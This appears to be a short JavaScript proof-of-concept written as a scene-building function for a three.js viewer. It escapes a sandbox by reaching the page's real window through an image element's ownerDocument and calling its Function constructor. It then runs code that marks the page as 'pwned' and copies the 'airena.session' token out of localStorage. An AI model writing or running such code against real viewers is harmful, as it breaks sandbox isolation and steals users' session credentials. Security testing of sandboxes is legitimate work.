function build(THREE, TSL){__fuel();
  const img = new THREE.ImageLoader().load('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==');
  const doc = img.ownerDocument;
  const win = doc.defaultView;
  const F = win.Function;
  F('window.__pwned = "arbitrary code in the viewer page"; window.__stolen = localStorage.getItem("airena.session");')();
  const g = new THREE.Object3D();
  g.userData.pose = function(s){__fuel(); {__fuel();return s;} };
  {__fuel();return g;}
}